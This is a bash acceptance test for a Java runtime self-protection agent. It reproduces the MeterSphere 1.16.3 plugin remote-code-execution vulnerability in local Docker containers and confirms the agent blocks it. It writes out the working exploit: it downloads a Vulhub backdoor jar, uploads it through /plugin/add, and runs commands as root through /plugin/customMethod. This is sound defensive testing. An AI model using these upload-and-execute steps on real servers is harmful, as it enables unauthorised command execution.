#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

image="${OHMYRASP_VULHUB_METERSPHERE_PLUGIN_IMAGE:-vulhub/metersphere:1.16.3}"
mysql_image="${OHMYRASP_VULHUB_METERSPHERE_PLUGIN_MYSQL_IMAGE:-mysql:5.7}"
kafka_image="${OHMYRASP_VULHUB_METERSPHERE_PLUGIN_KAFKA_IMAGE:-apache/kafka:3.7.0}"
network="${OHMYRASP_VULHUB_METERSPHERE_PLUGIN_NETWORK:-ohmyrasp-ms-plugin}"
db_name="${OHMYRASP_VULHUB_METERSPHERE_PLUGIN_DB_NAME:-ohmyrasp-ms-plugin-db}"
kafka_name="${OHMYRASP_VULHUB_METERSPHERE_PLUGIN_KAFKA_NAME:-ohmyrasp-ms-plugin-kafka}"
baseline_name="${OHMYRASP_VULHUB_METERSPHERE_PLUGIN_BASELINE_NAME:-ohmyrasp-ms-plugin-baseline}"
protected_name="${OHMYRASP_VULHUB_METERSPHERE_PLUGIN_PROTECTED_NAME:-ohmyrasp-ms-plugin-protected}"
baseline_port="${OHMYRASP_VULHUB_METERSPHERE_PLUGIN_BASELINE_PORT:-19284}"
protected_port="${OHMYRASP_VULHUB_METERSPHERE_PLUGIN_PROTECTED_PORT:-19285}"
plugin_url="${OHMYRASP_VULHUB_METERSPHERE_PLUGIN_URL:-https://github.com/vulhub/metersphere-plugin-Backdoor/releases/download/v1.1.0/metersphere-plugin-Backdoor-1.1.0-SNAPSHOT.jar}"
host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"
baseline_dir="logs/vulhub-metersphere-1.16.3-plugin-java8-baseline"
protected_dir="logs/vulhub-metersphere-1.16.3-plugin-java8-protected"
payload_dir="logs/vulhub-metersphere-1.16.3-plugin-java8-payload"
protected_log="${protected_dir}/events.jsonl"
marker="/tmp/ohmyrasp-metersphere-plugin-success"
plugin_jar="${OHMYRASP_VULHUB_METERSPHERE_PLUGIN_JAR:-${payload_dir}/Evil.jar}"
if [[ "$plugin_jar" != /* ]]; then
  plugin_jar="$(pwd)/${plugin_jar}"
fi

copy_artifacts() {
  local name="$1"
  local dir="$2"
  mkdir -p "$dir"
  if docker inspect "$name" >/dev/null 2>&1; then
    docker logs "$name" > "${dir}/container.log" 2>&1 || true
    docker exec "$name" sh -c 'find /opt/metersphere/data/body/plugin -maxdepth 3 -type f -print 2>/dev/null' \
      > "${dir}/plugin-files.txt" 2>/dev/null || true
  fi
}

cleanup() {
  copy_artifacts "$baseline_name" "$baseline_dir"
  copy_artifacts "$protected_name" "$protected_dir"
  copy_artifacts "$db_name" "$payload_dir"
  copy_artifacts "$kafka_name" "$payload_dir"
  docker rm -f -v "$baseline_name" "$protected_name" "$db_name" "$kafka_name" >/dev/null 2>&1 || true
  docker network rm "$network" >/dev/null 2>&1 || true
}
trap cleanup EXIT

curl_status() {
  local output="$1"
  shift
  local result
  result="$(curl --max-time 45 -sS -o "$output" -w "%{http_code}" "$@" \
    2>"${output}.err" || true)"
  if [[ -z "$result" ]]; then
    result="000"
  fi
  printf "%s" "$result"
}

verify_image_java8_lts() {
  mkdir -p "$payload_dir"
  docker run --rm --entrypoint java "$image" -version > "${payload_dir}/image-java-version.txt" 2>&1
  if ! grep -Eq 'version "1\.8\.' "${payload_dir}/image-java-version.txt"; then
    cat "${payload_dir}/image-java-version.txt" >&2 || true
    echo "MeterSphere plugin image did not report a Java 8 runtime" >&2
    exit 1
  fi
}

prepare_plugin_payload() {
  mkdir -p "$payload_dir"
  if [[ -z "${OHMYRASP_VULHUB_METERSPHERE_PLUGIN_JAR:-}" ]]; then
    curl -fL --retry 3 --retry-delay 2 -o "$plugin_jar" "$plugin_url"
  fi
  if [[ ! -s "$plugin_jar" ]]; then
    echo "MeterSphere plugin payload jar is missing or empty: ${plugin_jar}" >&2
    exit 1
  fi
  docker run --rm -v "${plugin_jar}:/payload/Evil.jar:ro" --entrypoint sh "$image" \
    -c 'jar tf /payload/Evil.jar' > "${payload_dir}/plugin-jar-contents.txt"
  if ! grep -Fq 'org/vulhub/Evil.class' "${payload_dir}/plugin-jar-contents.txt"; then
    cat "${payload_dir}/plugin-jar-contents.txt" >&2 || true
    echo "MeterSphere plugin payload jar does not contain org.vulhub.Evil" >&2
    exit 1
  fi
}

start_dependencies() {
  docker network create "$network" >/dev/null
  docker run -d --name "$db_name" --network "$network" \
    -e MYSQL_ROOT_PASSWORD=root -e MYSQL_DATABASE=metersphere \
    "$mysql_image" \
    --sql-mode="STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION" \
    --max-connections=8000 >/dev/null
  docker run -d --name "$kafka_name" --network "$network" --network-alias kafka \
    -e KAFKA_NODE_ID=1 \
    -e KAFKA_PROCESS_ROLES=broker,controller \
    -e KAFKA_CONTROLLER_QUORUM_VOTERS=1@kafka:9093 \
    -e KAFKA_LISTENERS=PLAINTEXT://:9092,CONTROLLER://:9093 \
    -e KAFKA_ADVERTISED_LISTENERS=PLAINTEXT://kafka:9092 \
    -e KAFKA_LISTENER_SECURITY_PROTOCOL_MAP=CONTROLLER:PLAINTEXT,PLAINTEXT:PLAINTEXT \
    -e KAFKA_CONTROLLER_LISTENER_NAMES=CONTROLLER \
    -e KAFKA_INTER_BROKER_LISTENER_NAME=PLAINTEXT \
    -e KAFKA_OFFSETS_TOPIC_REPLICATION_FACTOR=1 \
    "$kafka_image" >/dev/null
}

start_metersphere() {
  local name="$1"
  local port="$2"
  shift 2
  docker run -d --name "$name" --network "$network" \
    -p "${port}:8081" \
    -e MYSQL_SERVER="${db_name}:3306" \
    -e MYSQL_DB=metersphere \
    -e MYSQL_USERNAME=root \
    -e MYSQL_PASSWORD=root \
    -e KAFKA_SERVER=kafka:9092 \
    "$@" \
    "$image" >/dev/null
}

wait_for_plugin_api() {
  local name="$1"
  local port="$2"
  local dir="$3"
  mkdir -p "$dir"
  local status
  for attempt in $(seq 1 150); do
    status="$(curl_status "${dir}/plugin-list-ready-${attempt}.response" \
      "http://127.0.0.1:${port}/plugin/list")"
    printf 'ready_attempt=%s status=%s\n' "$attempt" "$status" >> "${dir}/attempts.log"
    if [[ "$status" == "200" ]] \
        && grep -Fq '"success":true' "${dir}/plugin-list-ready-${attempt}.response"; then
      cp "${dir}/plugin-list-ready-${attempt}.response" "${dir}/plugin-list.response"
      return
    fi
    if ! docker ps --filter "name=${name}" --filter status=running --format '{{.Names}}' \
      | grep -Fq "$name"; then
      docker logs "$name" >&2 || true
      echo "MeterSphere container ${name} stopped before plugin API readiness" >&2
      exit 1
    fi
    sleep 2
  done
  docker logs "$name" >&2 || true
  echo "MeterSphere plugin API did not become ready at ${port}" >&2
  exit 1
}

upload_plugin() {
  local port="$1"
  local dir="$2"
  local output="$3"
  curl_status "$output" \
    -F "file=@${plugin_jar};filename=Evil.jar;type=application/java-archive" \
    "http://127.0.0.1:${port}/plugin/add"
}

custom_method() {
  local port="$1"
  local request="$2"
  local output="$3"
  curl_status "$output" \
    -H 'Content-Type: application/json' \
    --data-binary "{\"entry\":\"org.vulhub.Evil\",\"request\":\"${request}\"}" \
    "http://127.0.0.1:${port}/plugin/customMethod"
}

assert_no_protected_detection() {
  if grep -q '"event":"ohmyrasp-detection"' "$protected_log"; then
    cat "$protected_log" >&2
    echo "protected MeterSphere produced a detection before plugin upload traffic" >&2
    exit 1
  fi
}

assert_no_protected_plugin_file() {
  docker exec "$protected_name" sh -c \
    'find /opt/metersphere/data/body/plugin -name "*Evil.jar" -print 2>/dev/null' \
    > "${protected_dir}/plugin-evil-files.txt" || true
  if [[ -s "${protected_dir}/plugin-evil-files.txt" ]]; then
    cat "${protected_dir}/plugin-evil-files.txt" >&2
    echo "protected MeterSphere still wrote the malicious plugin jar" >&2
    exit 1
  fi
}

rm -rf "$baseline_dir" "$protected_dir" "$payload_dir"
mkdir -p "$baseline_dir" "$protected_dir" "$payload_dir"
docker rm -f -v "$baseline_name" "$protected_name" "$db_name" "$kafka_name" >/dev/null 2>&1 || true
docker network rm "$network" >/dev/null 2>&1 || true

verify_image_java8_lts
prepare_plugin_payload
start_dependencies

start_metersphere "$baseline_name" "$baseline_port"
wait_for_plugin_api "$baseline_name" "$baseline_port" "$baseline_dir"

baseline_upload_status="$(upload_plugin "$baseline_port" "$baseline_dir" "${baseline_dir}/upload.response")"
if [[ "$baseline_upload_status" == "000" ]] || [[ "$baseline_upload_status" =~ ^4 ]]; then
  cat "${baseline_dir}/upload.response" >&2 || true
  echo "baseline MeterSphere plugin upload did not reach /plugin/add" >&2
  exit 1
fi

baseline_id_status="$(custom_method "$baseline_port" "id" "${baseline_dir}/custom-id.response")"
if [[ "$baseline_id_status" != "200" ]] || ! grep -Fq 'uid=0(root)' "${baseline_dir}/custom-id.response"; then
  cat "${baseline_dir}/custom-id.response" >&2 || true
  echo "baseline MeterSphere plugin customMethod did not execute id" >&2
  exit 1
fi

baseline_touch_status="$(custom_method "$baseline_port" "touch ${marker}" "${baseline_dir}/custom-touch.response")"
if [[ "$baseline_touch_status" != "200" ]] \
    || ! docker exec "$baseline_name" test -f "$marker"; then
  cat "${baseline_dir}/custom-touch.response" >&2 || true
  echo "baseline MeterSphere plugin customMethod did not create marker" >&2
  exit 1
fi

docker rm -f -v "$baseline_name" >/dev/null 2>&1 || true

start_metersphere "$protected_name" "$protected_port" \
  -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
  -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
  -e JAVA_TOOL_OPTIONS="-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true"
wait_for_plugin_api "$protected_name" "$protected_port" "$protected_dir"

if ! grep -q '"event":"ohmyrasp-java8-agent-start"' "$protected_log"; then
  cat "$protected_log" >&2 || true
  echo "missing Java 8 startup event in protected MeterSphere plugin container" >&2
  exit 1
fi
if ! grep -q '"upload_hook":"installed"' "$protected_log"; then
  cat "$protected_log" >&2 || true
  echo "missing Java 8 upload hook startup marker in protected MeterSphere plugin container" >&2
  exit 1
fi
assert_no_protected_detection

docker exec "$protected_name" rm -f "$marker"
protected_upload_status="$(upload_plugin "$protected_port" "$protected_dir" "${protected_dir}/upload.response")"
if [[ "$protected_upload_status" =~ ^2 ]]; then
  cat "${protected_dir}/upload.response" >&2 || true
  echo "protected MeterSphere plugin upload unexpectedly returned ${protected_upload_status}" >&2
  exit 1
fi
if ! grep -q '"hook":"MultipartUpload.filename".*"algorithm":"fileUpload_java_archive".*"action":"block"' "$protected_log"; then
  cat "$protected_log" >&2 || true
  echo "missing fileUpload_java_archive block event for MeterSphere plugin upload" >&2
  exit 1
fi
assert_no_protected_plugin_file

custom_method "$protected_port" "touch ${marker}" "${protected_dir}/custom-touch.response" >/dev/null
if docker exec "$protected_name" test -f "$marker"; then
  cat "${protected_dir}/custom-touch.response" >&2 || true
  echo "protected MeterSphere plugin customMethod still created marker after blocked upload" >&2
  exit 1
fi

echo "Vulhub MeterSphere plugin RCE Java 8 acceptance passed"
